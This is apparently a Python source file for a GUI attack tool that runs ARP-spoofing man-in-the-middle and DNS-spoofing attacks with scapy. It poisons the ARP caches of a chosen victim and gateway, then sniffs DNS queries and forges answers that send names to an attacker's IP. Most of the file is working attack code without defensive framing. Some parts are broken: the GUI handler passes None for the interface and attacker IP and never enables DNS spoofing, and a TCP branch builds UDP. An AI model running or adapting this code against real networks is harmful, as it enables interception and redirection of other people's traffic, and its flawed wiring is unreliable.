import tkinter.messagebox
from socket import *
from threading import Thread,Lock
import sys,re,random, requests, os

import tkinter as tk  # python 3
from tkinter import font  as tkfont  # python 3
# import Tkinter as tk     # python 2
# import tkFont as tkfont  # python 2
from tkinter import font as tkfont
from tkinter import font, messagebox
import PySimpleGUI as sg
from nav_bar import *

class MimtDnsSpoof(tk.Frame):
	def __init__(self, parent, controller):
		tk.Frame.__init__(self, parent)
		self.controller = controller
		abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
		display_nav_bar(self, controller)
		aboutframe = tk.Label(self, text="    Packet Sniffing Tool", bg='#3B5262', fg='white', anchor="c", font=abtframefont)
		aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

		allscreenframe = tk.Label(self, bg='white')
		allscreenframe.place(rely=0.2, relheight=1, relwidth=1)


		label = Label(self,text ="Victim IP:",font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.28, relx=0.16, relheight=0.04, relwidth=0.2)
		label = Label(self,text ="Gatewat IP:",font=('Calibri', 13),  bg='#4D6C84', fg='white', anchor='c').place(rely=0.33, relx=0.16, relheight=0.04, relwidth=0.2)
		label = Label(self,text ="Interface:",font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.38, relx=0.16, relheight=0.04, relwidth=0.2)
		label = Label(self,text ="Attacker's IP:",font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.43, relx=0.16, relheight=0.04, relwidth=0.2)

		self.entry = Entry(self, font=('Calibri', 14),)
		self.entry.place(rely=0.28, relx=0.36, relheight=0.04, relwidth=0.26)

		self.entry1 = Entry(self, font=('Calibri', 14),)
		self.entry1.place(rely=0.33, relx=0.36, relheight=0.04, relwidth=0.26)

		self.entry2 = Entry(self, font=('Calibri', 14),)
		self.entry2.place(rely=0.38, relx=0.36, relheight=0.04, relwidth=0.26)

		self.entry3 = Entry(self, font=('Calibri', 14),)
		self.entry3.place(rely=0.43, relx=0.36, relheight=0.04, relwidth=0.26)

		Button(self,text="Start",font=('Calibri', 14),bg='#4D6C84', fg='white', anchor='c',command=self.mymimtdns).place(rely=0.38, relx=0.7, relheight=0.08, relwidth=0.08)





	def mymimtdns(self):
		victim_ip = self.entry.get()
		gateway_ip = self.entry1.get()
		interface = self.entry2.get()
		attacker_ip = self.entry3.get()


		mitm_dns_attack(victim_ip, gateway_ip, mitm_out = None, dns = False, dns_out = None, interface = None, attacker_ip = None)






from scapy.all import *
import sys
import os
import time

# ----- MITM -----

def get_mac(IP):
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
    ans, unans = srp(request, timeout=2, retry=1)
    for sent, recv in ans:
        return recv.hwsrc

def reARP(mitm_out, victim_ip, gateway_ip):
    mitm_out.print("\n[*] Restoring targets...")
    victimMAC = get_mac(victim_ip)
    gateMAC = get_mac(gateway_ip)
    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 7)
    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= gateMAC), count = 7) 
    mitm_out.print("\n[*] Shutting Down...")

def spoofer(gm, vm, victim_ip, gateway_ip):
    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = vm))
    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = gm))

#  ------ Ends Here -------


# ----- DNSSpoofer -----

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep

def dnsSpoofer(dns_out, interfaceValue, attacker_ip):
    getDNSPacket = sniff(iface=interfaceValue, filter="dst port 53", count=1)

    if (getDNSPacket[0].haslayer(DNS)) and (getDNSPacket[0].getlayer(DNS).qr == 0) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and (getDNSPacket[0].getlayer(DNS).qd.qclass == 1):
        dns_out.print('\n Got Query on %s ' %ctime())

    clientSrcIP = getDNSPacket[0].getlayer(IP).src

    if getDNSPacket[0].haslayer(UDP):
        clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
    elif getDNSPacket[0].haslayer(TCP):
        clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
    else:
        pass

    clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id

    clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

    clientDNSServer = getDNSPacket[0].getlayer(IP).dst

    clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.name

    dns_out.print('Received Source IP: %s \n Recieved Source Port: %d \n Recieved Query ID: %d \n Query Data Count: %d \n Current DNS Server: %s \n DNS Query: %s ' %(clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery))

    spoofedDNSServerIP = attacker_ip.strip()

    spooftedIPPacket = IP(src=spoofedDNSServerIP, dst=clientSrcIP)

    if getDNSPacket[0].haslayer(UDP):
        spoofedUDP_TCPPacket = UDP(sport = 53, dport=clientSrcPort)
    elif getDNSPacket[0].haslayer(TCP):
        spoofedUDP_TCPPacket = UDP(sport = 53, dport=clientSrcPort)

    spoofedDNSPacket = DNS(id=clientDNSQueryID, qr=1, opcode=getDNSPacket[0].getlayer(DNS).opcode, aa=1, rd=0, ra=0, z=0, rcode=0, qdcount=clientDNSQueryDataCount, ancount=1, nscount=1, arcount=1, qd=DNSQR(qname = clientDNSQuery, qtype=getDNSPacket[0].getlayer(DNS).qd.qtype, qclass=getDNSPacket[0].getlayer(DNS).qd.qclass), an=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP, ttl=86400), ns=DNSRR(rrname=clientDNSQuery, type=2, ttl=86400, rdata=spoofedDNSServerIP), ar=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP))

    dns_out.print(' \n Sending spoofed response packet ')
    sendp(Ether()/spooftedIPPacket/spoofedUDP_TCPPacket/spoofedDNSPacket,iface=interfaceValue.strip(), count=1)
    dns_out.print(' Spoofed DNS Server: %s \n Source port: %d \n Destination port: %d ' %(spoofedDNSServerIP, 53, clientSrcPort))

# ----------------------

# DNS & MITM Combined

def mitm_dns_attack(victim_ip, gateway_ip, dns = False, mitm_out = None, dns_out = None, interface = None, attacker_ip = None):
    repeat = True

    try:
        victim_mac = get_mac(victim_ip)
    except Exception:
        mitm_out.print("\n[!] Couldn't find Victim's MAC Address! Exiting...")
        repeat = False

    try:
        gateway_mac = get_mac(gateway_ip)
    except Exception:
        mitm_out.print("\n[!] Couldn't find Gateway's MAC Address! Exiting...")
        repeat = False

    while repeat:
        try:
            spoofer(gateway_mac, victim_mac, victim_ip, gateway_ip)

            if dns == True:
                dnsSpoofer(dns_out, interface, attacker_ip)
            
            time.sleep(1.5)


        except KeyboardInterrupt:
            mitm_out.print("\n[*] User Requested Shutdown. Exiting...")

            if dns == True:
                dns_out.print("\n[*] User Requested Shutdown. Exiting...")

            reARP(mitm_out, victim_ip, gateway_ip)

            repeat = False
        
        except Exception as e:
            mitm_out.print("\n[!] Something went wrong! Exiting...")

            if dns == True:
                dns_out.print("\n[!] Something went wrong! Exiting...")

            reARP(mitm_out, victim_ip, gateway_ip)

            repeat = False
